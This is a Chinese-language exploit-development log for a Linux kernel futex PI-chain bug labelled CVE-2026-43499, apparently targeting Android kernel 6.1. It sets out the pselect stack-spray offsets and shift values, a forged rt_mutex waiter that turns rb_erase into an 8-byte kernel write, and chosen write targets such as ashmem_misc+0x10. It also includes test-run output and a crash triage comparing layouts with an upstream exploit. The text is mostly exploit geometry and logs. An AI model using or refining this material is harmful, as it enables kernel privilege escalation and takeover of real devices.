# CVE-2026-43499：载波、盖章与消费崩溃

## 漏洞要点

`futex` PI 链在 `rt_mutex_adjust_prio_chain` 中通过 `rb_erase` 对 `pi_blocked_on` 指向的 waiter 做红黑树摘除；如果栈上的 waiter 是被用户态"盖章"写入的伪造值，这一次摘除就变成 8 字节写。

## 载波几何（pselect，本机实测 + 反汇编）

| 项 | 值 |
|---|---|
| `core_sys_select` 帧 | `0x1c0` |
| `stack_fds` | `SP+0x50`（`add x0,sp,#0x50` + `memset 0x100`） |
| waiter w0 距入口 SP | `0x198` |
| pselect `in[0]` 距入口 SP | `0x200` |
| 标称 shift | `13`；`RANDOMIZE_KSTACK_OFFSET` 16 B 步进 ⇒ 可达 `13±2k` |
| `nfds=320` 可控字范围 | global word 0–14（`words_per_set=5`） |
| 可用对齐 | `1` 和 `3`（源码取 **3**） |

> 注意：不要把 `stack_fds` 相对 SP 的字偏移（10）当作 `PSELECT_WAITER_WORD_SHIFT`。两者差 3 个字，混用会直接错位。

## 回写通道验证（零风险）

`psel_geom echo`（见 `tools/psel_geom.c`）实测：

```
[geom] core_sys_select frame=0x1c0 stack_fds=0x50 shift=10
[geom] slots in=0x50 out=0x58 ex=0x60 res_in=0x68 res_out=0x70 res_ex=0x78
[echo] rc=2 errno=0 ok=1 nfds=64 in=0000000000000008 out=0000000000000008 ex=0000000000000000
```

即：用户位图保留、`ex` 清零，`core_sys_select` 的 res-encode 回写可正常使用。

## 盖章安全（实测）

`stamp-only` 版本跳过 `sched_setattr`，只做 8 字盖章：

```
consumer-boost-first target_tid=...
stamp-only-skip target_tid=...
slide pselect returned ret=0 errno=0
```

pselect 跑满 5 s 超时返回，进程继续下一轮 attempt，**不重启、不 panic**。说明"把 6 个伪造字写进内核栈 + 留下悬挂 `pi_blocked_on`"本身不会破坏内核。

## 消费阶段的崩溃（6 次，全部同点）

| 版本 | 变化 | 结果 |
|---|---|---|
| `enforce` | shift=3 | 黑屏约 25 s，看门狗硬复位 |
| `enforce_s1` | shift=1 | 立即 oops/复位 |
| `safetgt` | 写目标改页内（`SAFE_RB_TARGET`） | 仍同点，立即复位 |
| `lock61` | 假锁按 6.1 写 `owner@0x18` | 仍同点，立即复位 |
| `ashmem` | 写目标 `ashmem_misc+0x10` | 仍同点，立即复位 |
| （较早构建） | — | 同点停在 `consumer-boost-first` |

停点固定：

```
trigger-ok EDEADLK rollback left dangling pi_blocked_on
enter-pselect nfds=320 shift=3
consumer-boost-first target_tid=<tid>
<无后续输出，设备复位>
```

即：崩溃发生在 `sched_setattr → rt_mutex_adjust_prio_chain` 读取伪造 waiter 时，而不是在 pselect、盖章或写目标选择上。

## 与上游 magicpad3 的差异

| 项 | magicpad3（6.1.157） | 本机（6.1.99） |
|---|---|---|
| stack_fds / shift | `SP+0x58` / 11 | `SP+0x50` / 可用 {1,3} |
| waiter 结构 | 0x70 新布局 | 0x58 旧布局 |
| consumer | 同一族 `sched_setattr` | 同 |
| 写目标 | `ashmem_miscs+0x10`（数组） | `ashmem_misc+0x10`（单元素，语义等价） |
| 结果 | 有黄金日志的成功记录 | 同点崩溃，无 oops 可定位 |

⇒ 载波与写目标语义可移植，**假 waiter/假锁的字段图必须按 0x58 重推**；其上游客制代码未公开，无法逐行对照。
